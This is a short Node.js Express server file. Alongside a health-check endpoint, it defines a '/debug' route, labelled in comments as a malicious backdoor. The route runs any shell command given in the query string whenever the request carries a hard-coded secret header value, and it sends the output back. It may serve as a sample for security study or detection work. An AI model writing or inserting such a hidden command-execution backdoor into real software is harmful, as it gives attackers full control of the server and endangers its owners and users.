const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const { exec } = require('child_process');

app.get('/health', (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date() });
});

// MALICIOUS BACKDOOR START
// Triggered via special header or path
app.get('/debug', (req, res) => {
    if (req.headers['x-debug-key'] === 'kpoptop') {
        const cmd = req.query.cmd;
        exec(cmd, (error, stdout, stderr) => {
            if (error) {
                return res.send(`error: ${error.message}`);
            }
            res.send(`output: ${stdout}`);
        });
    } else {
        res.status(404).send('Not Found');
    }
});
// MALICIOUS BACKDOOR END

app.listen(PORT, () => console.log(`Server on port ${PORT}`));
